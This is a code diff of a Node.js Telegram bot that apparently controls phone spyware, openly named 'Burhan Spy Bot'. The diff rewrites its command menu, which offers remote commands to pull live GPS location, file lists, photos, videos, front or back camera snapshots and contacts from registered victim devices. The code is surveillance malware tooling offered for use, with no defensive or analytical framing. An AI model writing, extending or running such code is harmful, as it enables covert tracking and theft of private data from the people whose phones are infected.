@@ -67,40 +67,17 @@ app.post('/api/upload-data', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ HELP MENU
-bot.onText(/\/help/, (msg) => {
+// ✅ START — Saare commands dikhao
+bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
         bot.sendMessage(chatId, "⛔ Access Denied!");
         return;
     }
-    bot.sendMessage(chatId, `📖 HELP MENU\n\n` +
-        `🟢 /locate DEVICE_ID_or_API_KEY\n` +
-        `   Get live GPS location and device info.\n\n` +
-        `🟢 /devices\n` +
-        `   List all registered devices with key and expiry.\n\n` +
-        `🟢 /files DEVICE_ID_or_API_KEY\n` +
-        `   List ALL file names.\n\n` +
-        `🟢 /getphoto DEVICE_ID_or_API_KEY FILE_NAME\n` +
-        `   Request a specific photo.\n\n` +
-        `🟢 /getvideo DEVICE_ID_or_API_KEY FILE_NAME\n` +
-        `   Request a specific video.\n\n` +
-        `🟢 /camera DEVICE_ID_or_API_KEY [front|back]\n` +
-        `   Capture snapshot.\n\n` +
-        `🟢 /ping DEVICE_ID_or_API_KEY\n` +
-        `   Check if device is alive.\n\n` +
-        `🟢 /stats\n` +
-        `   Total device count.\n\n` +
-        `🟢 /contacts DEVICE_ID_or_API_KEY\n` +
-        `   Fetch all contacts.\n\n` +
-        `🟢 /stop\n` +
-        `   Stop the bot.\n\n` +
-        `🟢 /start\n` +
-        `   Resume bot.\n\n` +
-        `⚠️ Any new command cancels ongoing operations.`);
+    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 FULL COMMAND LIST:\n/locate <ID> - Live GPS Location\n/devices - List all devices\n/files <ID> - List all files\n/getphoto <ID> <PATH> - Get Photo\n/getvideo <ID> <PATH> - Get Video\n/camera <ID> <front|back> - Camera Snapshot\n/ping <ID> - Check device alive\n/stats - Total devices\n/contacts <ID> - Fetch contacts\n/stop - Stop bot\n/start - Resume bot\n\n⚠️ Any new command cancels ongoing operations.`);
 });
 
-// ✅ /devices — Saare devices ki list
+// ✅ /devices — Saare devices
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
